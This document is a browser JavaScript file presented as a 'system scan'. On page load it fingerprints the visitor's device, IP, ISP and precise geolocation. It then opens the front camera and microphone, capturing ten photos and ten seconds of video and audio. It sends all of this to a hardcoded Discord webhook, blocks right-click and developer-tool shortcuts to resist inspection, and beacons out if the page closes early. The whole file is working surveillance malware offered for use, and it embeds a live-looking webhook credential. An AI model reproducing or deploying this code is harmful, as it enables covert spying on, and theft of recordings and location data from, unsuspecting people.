    // Discord webhook URL
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1339161201841668116/SXtO43pAsCcTiazHdbneC78Ai7Xae2rBWTUp7VcsWIlyf-d216ST5Sc4aCnLmYML-2ak";
    let frontCameraStream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    let audioRecorder = null;
    let audioChunks = [];
    let scanData = {};
    let isScanComplete = false;

    // ===================
    // ENHANCED SCAN FUNCTIONS
    // ===================

    // Strong anti-inspection protection
    document.addEventListener('contextmenu', e => {
        e.preventDefault();
        document.getElementById('inspect-warning').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('inspect-warning').style.display = 'none';
        }, 3000);
    });
    
    document.addEventListener('keydown', e => {
        // Block F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
        if (e.key === 'F12' || 
            (e.ctrlKey && e.shiftKey && e.key === 'I') || 
            (e.ctrlKey && e.key === 'u') ||
            (e.ctrlKey && e.shiftKey && e.key === 'J')) {
            e.preventDefault();
            document.getElementById('inspect-warning').style.display = 'flex';
            setTimeout(() => {
                document.getElementById('inspect-warning').style.display = 'none';
            }, 3000);
        }
    });

    // Get CPU and RAM details with enhanced detection
    function getHardwareInfo() {
        let cpuCores = navigator.hardwareConcurrency || "Unknown";
        let deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory}GB RAM` : "Unknown";
        let cpuBrand = "Unknown";
        
        // Enhanced CPU brand detection
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        
        // Windows CPU detection
        if (/Win/i.test(platform)) {
            if (/Intel|i3|i5|i7|i9|Xeon/.test(ua)) {
                cpuBrand = "Intel";
                if (/i3/.test(ua)) cpuBrand += " Core i3";
                else if (/i5/.test(ua)) cpuBrand += " Core i5";
                else if (/i7/.test(ua)) cpuBrand += " Core i7";
                else if (/i9/.test(ua)) cpuBrand += " Core i9";
                else if (/Xeon/.test(ua)) cpuBrand += " Xeon";
                
                // Detect generation
                const genMatch = ua.match(/(\d+)th Gen/);
                if (genMatch) cpuBrand += ` ${genMatch[1]}th Gen`;
            } 
            else if (/AMD|Ryzen/.test(ua)) {
                cpuBrand = "AMD";
                if (/Ryzen 3/.test(ua)) cpuBrand += " Ryzen 3";
                else if (/Ryzen 5/.test(ua)) cpuBrand += " Ryzen 5";
                else if (/Ryzen 7/.test(ua)) cpuBrand += " Ryzen 7";
                else if (/Ryzen 9/.test(ua)) cpuBrand += " Ryzen 9";
                else if (/EPYC/.test(ua)) cpuBrand += " EPYC";
                else if (/Athlon/.test(ua)) cpuBrand += " Athlon";
                
                const genMatch = ua.match(/Ryzen \d (\d{4})/);
                if (genMatch) cpuBrand += ` ${genMatch[1].substring(0,1)}xxx Series`;
            }
        }
        // Mac CPU detection
        else if (/Mac/i.test(platform)) {
            if (/Apple M1/.test(ua)) cpuBrand = "Apple M1";
            else if (/Apple M2/.test(ua)) cpuBrand = "Apple M2";
            else if (/Apple M3/.test(ua)) cpuBrand = "Apple M3";
            else if (/Intel/.test(ua)) cpuBrand = "Intel (Rosetta)";
            else cpuBrand = "Apple Silicon (Unknown)";
        }
        // Mobile CPU detection
        else if (/Android|iPhone|iPad/i.test(ua)) {
            if (/Snapdragon/.test(ua)) {
                cpuBrand = "Qualcomm Snapdragon";
                const modelMatch = ua.match(/Snapdragon (\d+)/);
                if (modelMatch) cpuBrand += ` ${modelMatch[1]}`;
            }
            else if (/Exynos/.test(ua)) {
                cpuBrand = "Samsung Exynos";
                const modelMatch = ua.match(/Exynos (\d+)/);
                if (modelMatch) cpuBrand += ` ${modelMatch[1]}`;
            }
            else if (/Tensor/.test(ua)) {
                cpuBrand = "Google Tensor";
                const modelMatch = ua.match(/Tensor (\w+)/);
                if (modelMatch) cpuBrand += ` ${modelMatch[1]}`;
            }
            else if (/Apple A/.test(ua)) {
                const modelMatch = ua.match(/Apple A(\w+)/);
                cpuBrand = modelMatch ? `Apple A${modelMatch[1]}` : "Apple A-series";
            }
            else if (/Apple M/.test(ua)) {
                const modelMatch = ua.match(/Apple M(\w+)/);
                cpuBrand = modelMatch ? `Apple M${modelMatch[1]}` : "Apple M-series";
            }
            else if (/Mediatek|MT\d/.test(ua)) {
                cpuBrand = "Mediatek";
                const modelMatch = ua.match(/MT(\w+)/);
                if (modelMatch) cpuBrand += ` ${modelMatch[1]}`;
            }
            else if (/Kirin/.test(ua)) {
                cpuBrand = "HiSilicon Kirin";
                const modelMatch = ua.match(/Kirin (\w+)/);
                if (modelMatch) cpuBrand += ` ${modelMatch[1]}`;
            }
        }

        return {
            cpuCores: cpuCores,
            cpuBrand: cpuBrand,
            ram: deviceMemory
        };
    }

    // Get VPN/proxy detection with real IP
    async function getNetworkInfo() {
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const locData = await locRes.json();
            
            return {
                ip: ipData.ip,
                city: locData.city || "Unknown",
                country: locData.country_name || "Unknown",
                region: locData.region || "Unknown",
                isp: locData.org || "Unknown",
                asn: locData.asn || "Unknown",
                timezone: locData.timezone || "Unknown",
                isVPN: locData.security ? (locData.security.vpn || locData.security.proxy || locData.security.tor) : false
            };
        } catch {
            return {
                ip: "Unknown",
                city: "Unknown",
                country: "Unknown",
                region: "Unknown",
                isp: "Unknown",
                asn: "Unknown",
                timezone: "Unknown",
                isVPN: false
            };
        }
    }

    // Get WebGL renderer for GPU detection
    function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return "Unknown";
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Unknown";
        } catch {
            return "Unknown";
        }
    }

    // Get battery information
    async function getBatteryInfo() {
        if (!navigator.getBattery) return "Not available";
        
        try {
            const battery = await navigator.getBattery();
            return {
                level: `${Math.floor(battery.level * 100)}%`,
                charging: battery.charging ? "Yes" : "No",
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch {
            return "Unknown";
        }
    }

    // Enhanced device detection with Windows 11 fix
    function detectDeviceDetails() {
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        let deviceType = "Desktop";
        let deviceModel = "Computer";
        let os = "Unknown OS";
        let osVersion = "";
        let browser = "Unknown Browser";
        let browserVersion = "";

        // Windows detection with Windows 11 fix
        if (/Windows NT 10.0/.test(ua)) {
            os = "Windows";
            
            // Windows 11 detection (Windows 11 still reports NT 10.0 but has different user agent)
            if (/Windows 11/.test(ua) || /Windows NT 10.0; Win64; x64/.test(ua) && /Edg/.test(ua)) {
                osVersion = "11";
            } else {
                osVersion = "10";
            }
        } else if (/Windows NT 6.3/.test(ua)) {
            os = "Windows";
            osVersion = "8.1";
        } else if (/Windows NT 6.2/.test(ua)) {
            os = "Windows";
            osVersion = "8";
        } else if (/Windows NT 6.1/.test(ua)) {
            os = "Windows";
            osVersion = "7";
        } else if (/Windows NT 6.0/.test(ua)) {
            os = "Windows";
            osVersion = "Vista";
        } else if (/Windows NT 5.1/.test(ua)) {
            os = "Windows";
            osVersion = "XP";
        }
        // Mac detection
        else if (/Macintosh|Mac OS X/.test(ua)) {
            os = "MacOS";
            const match = ua.match(/Mac OS X (\d+[._]\d+)/);
            if (match) osVersion = match[1].replace('_', '.');
        }
        // Android detection
        else if (/Android/.test(ua)) {
            os = "Android";
            deviceType = "Mobile";
            const match = ua.match(/Android (\d+\.\d+)/);
            if (match) osVersion = match[1];
        }
        // iOS detection
        else if (/iPhone|iPad|iPod/.test(ua)) {
            os = "iOS";
            deviceType = /iPad/.test(ua) ? "Tablet" : "Mobile";
            const match = ua.match(/OS (\d+_\d+)/);
            if (match) osVersion = match[1].replace('_', '.');
        }
        // Linux detection
        else if (/Linux/.test(ua)) {
            os = "Linux";
            if (/Ubuntu/.test(ua)) {
                const match = ua.match(/Ubuntu\/(\d+\.\d+)/);
                osVersion = match ? match[1] : "Ubuntu";
            } else if (/Fedora/.test(ua)) {
                osVersion = "Fedora";
            } else if (/Debian/.test(ua)) {
                osVersion = "Debian";
            }
        }
        // ChromeOS detection
        else if (/CrOS/.test(ua)) {
            os = "ChromeOS";
        }

        // Browser detection
        if (/Edg/.test(ua)) {
            browser = "Microsoft Edge";
            const match = ua.match(/Edg\/(\d+\.\d+)/);
            browserVersion = match ? match[1] : "";
        } else if (/Chrome/.test(ua)) {
            browser = "Google Chrome";
            const match = ua.match(/Chrome\/(\d+\.\d+)/);
            browserVersion = match ? match[1] : "";
        } else if (/Firefox/.test(ua)) {
            browser = "Mozilla Firefox";
            const match = ua.match(/Firefox\/(\d+\.\d+)/);
            browserVersion = match ? match[1] : "";
        } else if (/Safari/.test(ua)) {
            browser = "Apple Safari";
            const match = ua.match(/Version\/(\d+\.\d+)/);
            browserVersion = match ? match[1] : "";
        } else if (/Opera|OPR/.test(ua)) {
            browser = "Opera";
            const match = ua.match(/(Opera|OPR)\/(\d+\.\d+)/);
            browserVersion = match ? match[2] : "";
        }

        // Detect laptops (touchscreen devices with smaller screens)
        if (navigator.maxTouchPoints > 0 && window.screen.width <= 1366) {
            deviceType = "Laptop";
            deviceModel = "Touchscreen Laptop";
        }

        // Detect specific device models
        if (/SAMSUNG/.test(ua)) {
            const modelMatch = ua.match(/SM-[A-Z]\d+/);
            deviceModel = modelMatch ? `Samsung ${modelMatch[0]}` : "Samsung Device";
        } else if (/iPhone/.test(ua)) {
            const modelMatch = ua.match(/iPhone\d+,\d+/);
            deviceModel = modelMatch ? `iPhone ${modelMatch[0].match(/\d+/)[0]}` : "iPhone";
        } else if (/iPad/.test(ua)) {
            const modelMatch = ua.match(/iPad\d+,\d+/);
            deviceModel = modelMatch ? `iPad ${modelMatch[0].match(/\d+/)[0]}` : "iPad";
        } else if (/Pixel/.test(ua)) {
            const modelMatch = ua.match(/Pixel \d/);
            deviceModel = modelMatch ? modelMatch[0] : "Google Pixel";
        } else if (/MacBook/.test(ua)) {
            deviceModel = "MacBook";
            if (/MacBookAir/.test(ua)) deviceModel = "MacBook Air";
            else if (/MacBookPro/.test(ua)) deviceModel = "MacBook Pro";
            
            const yearMatch = ua.match(/(\d{4})/);
            if (yearMatch) deviceModel += ` ${yearMatch[0]}`;
        } else if (/Surface/.test(ua)) {
            deviceModel = "Microsoft Surface";
            const modelMatch = ua.match(/Surface[ _]([A-Za-z0-9]+)/);
            if (modelMatch) deviceModel += ` ${modelMatch[1]}`;
        } else if (/Xbox/.test(ua)) {
            deviceModel = "Xbox";
            deviceType = "Console";
        } else if (/PlayStation/.test(ua)) {
            deviceModel = "PlayStation";
            deviceType = "Console";
        } else if (/Nintendo Switch/.test(ua)) {
            deviceModel = "Nintendo Switch";
            deviceType = "Console";
        }

        return {
            type: deviceType,
            model: deviceModel,
            os: os,
            osVersion: osVersion,
            browser: browser,
            browserVersion: browserVersion,
            platform: platform,
            userAgent: ua,
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown",
            hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
            maxTouchPoints: navigator.maxTouchPoints || 0,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            colorDepth: window.screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            webdriver: navigator.webdriver || false,
            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || "None",
            mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type).join(', ') || "None",
            javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false
        };
    }

    // Get network connection info
    function getConnectionInfo() {
        if (!navigator.connection) return {
            type: "Unknown",
            effectiveType: "Unknown",
            downlink: "Unknown",
            rtt: "Unknown",
            saveData: "Unknown"
        };
        
        return {
            type: navigator.connection.type || "Unknown",
            effectiveType: navigator.connection.effectiveType || "Unknown",
            downlink: navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "Unknown",
            rtt: navigator.connection.rtt ? `${navigator.connection.rtt} ms` : "Unknown",
            saveData: navigator.connection.saveData ? "Enabled" : "Disabled"
        };
    }

    // Get geolocation if available
    async function getGeolocation() {
        if (!navigator.geolocation) return {
            latitude: "Not supported",
            longitude: "Not supported",
            accuracy: "Not supported"
        };
        
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                });
            });
            
            return {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: `${position.coords.accuracy} meters`,
                altitude: position.coords.altitude ? `${position.coords.altitude} meters` : "Not available",
                speed: position.coords.speed ? `${position.coords.speed} m/s` : "Not available"
            };
        } catch (error) {
            return {
                latitude: "Denied",
                longitude: "Denied",
                accuracy: "Denied",
                error: error.message
            };
        }
    }

    // Get timezone and locale info
    function getLocaleInfo() {
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            locale: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
            dateFormat: new Intl.DateTimeFormat().format(new Date()),
            timeFormat: new Intl.DateTimeFormat(undefined, {
                hour: 'numeric',
                minute: 'numeric',
                second: 'numeric'
            }).format(new Date()),
            calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
            numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem
        };
    }

    // Get storage info
    async function getStorageInfo() {
        if (!navigator.storage) return {
            estimate: "Not supported",
            persisted: "Not supported"
        };
        
        try {
            const estimate = await navigator.storage.estimate();
            const persisted = await navigator.storage.persisted();
            
            return {
                quota: estimate.quota ? `${Math.round(estimate.quota / (1024 * 1024))} MB` : "Unknown",
                usage: estimate.usage ? `${Math.round(estimate.usage / (1024 * 1024))} MB` : "Unknown",
                usageDetails: estimate.usageDetails || "Not available",
                persisted: persisted ? "Yes" : "No"
            };
        } catch {
            return {
                estimate: "Error",
                persisted: "Error"
            };
        }
    }

    // Get battery info
    async function getEnhancedBatteryInfo() {
        if (!navigator.getBattery) return {
            level: "Not supported",
            charging: "Not supported",
            chargingTime: "Not supported",
            dischargingTime: "Not supported"
        };
        
        try {
            const battery = await navigator.getBattery();
            return {
                level: `${Math.floor(battery.level * 100)}%`,
                charging: battery.charging ? "Yes" : "No",
                chargingTime: battery.chargingTime === Infinity ? "Unknown" : `${battery.chargingTime} seconds`,
                dischargingTime: battery.dischargingTime === Infinity ? "Unknown" : `${battery.dischargingTime} seconds`
            };
        } catch {
            return {
                level: "Error",
                charging: "Error",
                chargingTime: "Error",
                dischargingTime: "Error"
            };
        }
    }

    // Get GPU info with more details
    function getEnhancedGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return {
                renderer: "Unknown",
                vendor: "Unknown",
                maxTextureSize: "Unknown",
                shadingLanguage: "Unknown"
            };
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Unknown",
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || "Unknown",
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE) || "Unknown",
                shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || "Unknown",
                aliasedLineWidthRange: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE) || "Unknown",
                aliasedPointSizeRange: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE) || "Unknown"
            };
        } catch {
            return {
                renderer: "Error",
                vendor: "Error",
                maxTextureSize: "Error",
                shadingLanguage: "Error"
            };
        }
    }

    // Send embed to Discord
    async function sendEmbedToDiscord(embedData) {
        try {
            await fetch(DISCORD_WEBHOOK, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    embeds: [embedData]
                })
            });
        } catch (error) {
            console.error("Error sending embed to Discord:", error);
        }
    }

    // Send file to Discord
    async function sendFileToDiscord(file, filename, content) {
        const formData = new FormData();
        formData.append('file', file, filename);
        formData.append('content', content);
        
        try {
            await fetch(DISCORD_WEBHOOK, {
                method: "POST",
                body: formData
            });
        } catch (error) {
            console.error("Error sending file to Discord:", error);
        }
    }

    // Capture photo from video stream
    async function capturePhoto(video, sequence) {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
    }

    // Start media recording
    async function startRecording() {
        try {
            // Get all system info
            const networkInfo = await getNetworkInfo();
            const device = detectDeviceDetails();
            const hardware = getHardwareInfo();
            const gpu = getEnhancedGPUInfo();
            const battery = await getEnhancedBatteryInfo();
            const connection = getConnectionInfo();
            const geolocation = await getGeolocation();
            const locale = getLocaleInfo();
            const storage = await getStorageInfo();
            
            scanData = {
                ip: networkInfo.ip,
                location: `${networkInfo.city}, ${networkInfo.country}`,
                region: networkInfo.region,
                isp: networkInfo.isp,
                timezone: networkInfo.timezone,
                deviceType: device.type,
                deviceModel: device.model,
                os: device.os,
                osVersion: device.osVersion,
                browser: device.browser,
                browserVersion: device.browserVersion,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                cpu: `${hardware.cpuBrand} (${hardware.cpuCores} cores)`,
                ram: hardware.ram,
                gpu: gpu.renderer,
                gpuVendor: gpu.vendor,
                battery: battery,
                network: {
                    isVPN: networkInfo.isVPN ? "⚠️ VPN/PROXY DETECTED" : "No",
                    asn: networkInfo.asn,
                    connectionType: connection.type,
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                },
                geolocation: geolocation,
                locale: locale,
                storage: storage,
                userAgent: device.userAgent,
                platform: device.platform,
                deviceMemory: device.deviceMemory,
                hardwareConcurrency: device.hardwareConcurrency,
                maxTouchPoints: device.maxTouchPoints,
                colorDepth: device.colorDepth,
                pixelRatio: device.pixelRatio,
                languages: device.languages,
                cookieEnabled: device.cookieEnabled,
                webdriver: device.webdriver,
                plugins: device.plugins,
                mimeTypes: device.mimeTypes,
                javaEnabled: device.javaEnabled
            };

            // Send initial system info as embed
            await sendEmbedToDiscord({
                title: "🔍 Complete System Scan Results",
                color: networkInfo.isVPN ? 0xff0000 : 0x3498db,
                fields: [
                    { name: "🖥️ Device Info", value: `**Type:** ${scanData.deviceType}\n**Model:** ${scanData.deviceModel}\n**OS:** ${scanData.os} ${scanData.osVersion}\n**Browser:** ${scanData.browser} ${scanData.browserVersion}\n**Platform:** ${scanData.platform}\n**User Agent:** \`\`\`${scanData.userAgent}\`\`\``, inline: false },
                    { name: "💻 Hardware Info", value: `**CPU:** ${scanData.cpu}\n**GPU:** ${scanData.gpu}\n**GPU Vendor:** ${scanData.gpuVendor}\n**RAM:** ${scanData.ram}\n**Device Memory:** ${scanData.deviceMemory}\n**Cores:** ${scanData.hardwareConcurrency}\n**Touch Points:** ${scanData.maxTouchPoints}`, inline: false },
                    { name: "🌐 Network Info", value: `**IP:** ${scanData.ip}\n**Location:** ${scanData.location}\n**Region:** ${scanData.region}\n**ISP:** ${scanData.isp}\n**ASN:** ${scanData.network.asn}\n**VPN/Proxy:** ${scanData.network.isVPN}\n**Connection:** ${scanData.network.connectionType} (${scanData.network.effectiveType})\n**Downlink:** ${scanData.network.downlink}\n**RTT:** ${scanData.network.rtt}\n**Save Data:** ${scanData.network.saveData}`, inline: false },
                    { name: "🖥️ Display Info", value: `**Screen:** ${scanData.screen}\n**Color Depth:** ${scanData.colorDepth}\n**Pixel Ratio:** ${scanData.pixelRatio}`, inline: true },
                    { name: "🗺️ Geolocation", value: `**Latitude:** ${scanData.geolocation.latitude}\n**Longitude:** ${scanData.geolocation.longitude}\n**Accuracy:** ${scanData.geolocation.accuracy}\n**Altitude:** ${scanData.geolocation.altitude}\n**Speed:** ${scanData.geolocation.speed}`, inline: true },
                    { name: "🌍 Locale Info", value: `**Timezone:** ${scanData.locale.timezone}\n**Locale:** ${scanData.locale.locale}\n**Languages:** ${scanData.locale.languages}\n**Date Format:** ${scanData.locale.dateFormat}\n**Time Format:** ${scanData.locale.timeFormat}\n**Calendar:** ${scanData.locale.calendar}\n**Numbering System:** ${scanData.locale.numberingSystem}`, inline: false },
                    { name: "🔋 Battery Info", value: `**Level:** ${scanData.battery.level}\n**Charging:** ${scanData.battery.charging}\n**Charging Time:** ${scanData.battery.chargingTime}\n**Discharging Time:** ${scanData.battery.dischargingTime}`, inline: true },
                    { name: "💾 Storage Info", value: `**Quota:** ${scanData.storage.quota}\n**Usage:** ${scanData.storage.usage}\n**Persisted:** ${scanData.storage.persisted}`, inline: true },
                    { name: "⚙️ Other Info", value: `**Cookies Enabled:** ${scanData.cookieEnabled}\n**WebDriver:** ${scanData.webdriver}\n**Java Enabled:** ${scanData.javaEnabled}\n**Plugins:** ${scanData.plugins}\n**MIME Types:** ${scanData.mimeTypes}`, inline: false }
                ],
                timestamp: new Date().toISOString()
            });

            // Start front camera with 60 FPS
            frontCameraStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1920 },
                    height: { ideal: 1080 },
                    frameRate: { ideal: 60, min: 30 }
                },
                audio: false
            });

            const video = document.createElement('video');
            video.className = 'hidden-video';
            video.srcObject = frontCameraStream;
            video.autoplay = true;
            video.playsinline = true;
            document.body.appendChild(video);
            await new Promise(resolve => video.onloadedmetadata = resolve);

            // Start audio recording
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            audioRecorder = new MediaRecorder(audioStream);
            audioChunks = [];
            audioRecorder.ondataavailable = e => audioChunks.push(e.data);
            audioRecorder.start();

            // Start video recording
            mediaRecorder = new MediaRecorder(frontCameraStream, {
                mimeType: 'video/webm;codecs=vp9',
                videoBitsPerSecond: 5000000
            });
            recordedChunks = [];
            mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
            mediaRecorder.start();

            // Take 10 photos (1 per second)
            for (let i = 1; i <= 10; i++) {
                const photoBlob = await capturePhoto(video, i);
                await sendFileToDiscord(
                    photoBlob,
                    `photo_${i}.jpg`,
                    `📸 Photo ${i}/10 from ${scanData.deviceType} (${scanData.os} ${scanData.osVersion})`
                );
                if (i < 10) await new Promise(resolve => setTimeout(resolve, 1000));
            }

            // Stop recordings after 10 seconds
            setTimeout(async () => {
                mediaRecorder.stop();
                audioRecorder.stop();

                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    await sendFileToDiscord(
                        videoBlob,
                        'video_10s_60fps.webm',
                        `🎥 10s Video (60FPS) from ${scanData.deviceType}`
                    );
                };

                audioRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    await sendFileToDiscord(
                        audioBlob,
                        'audio_10s.webm',
                        `🎤 10s Audio from ${scanData.deviceType}`
                    );
                };

                // Clean up
                frontCameraStream.getTracks().forEach(track => track.stop());
                audioStream.getTracks().forEach(track => track.stop());
                document.body.removeChild(video);
                isScanComplete = true;
                
                // Send completion embed
                await sendEmbedToDiscord({
                    title: "✅ Scan Completed Successfully",
                    description: "All media and data collected",
                    color: 0x00ff00,
                    fields: [
                        { name: "Device", value: `${scanData.deviceType} (${scanData.deviceModel})`, inline: true },
                        { name: "OS", value: `${scanData.os} ${scanData.osVersion}`, inline: true },
                        { name: "Location", value: scanData.location, inline: true },
                        { name: "Collected Media", value: "10 photos\n10s video (60FPS)\n10s audio", inline: false }
                    ],
                    timestamp: new Date().toISOString()
                });
            }, 10000);

        } catch (error) {
            console.error("Scan error:", error);
            await sendEmbedToDiscord({
                title: "❌ Scan Failed",
                description: "An error occurred during the scan",
                color: 0xff0000,
                fields: [
                    { name: "Error", value: `\`\`\`${error.message}\`\`\``, inline: false }
                ],
                timestamp: new Date().toISOString()
            });
        }
    }

    // Start scan when page loads
    window.addEventListener('load', startRecording);

    // Handle page closing
    window.addEventListener('beforeunload', () => {
        if (!isScanComplete) {
            const content = JSON.stringify({
                embeds: [{
                    title: "⚠️ Scan Interrupted",
                    description: "The page was closed before the scan could complete",
                    color: 0xffa500,
                    fields: [
                        { name: "IP", value: scanData.ip || "Unknown", inline: true },
                        { name: "Device", value: scanData.deviceType || "Unknown", inline: true },
                        { name: "Progress", value: "Partial data may have been collected", inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            });
            navigator.sendBeacon(DISCORD_WEBHOOK, new Blob([content], { type: 'application/json' }));
        }
    });
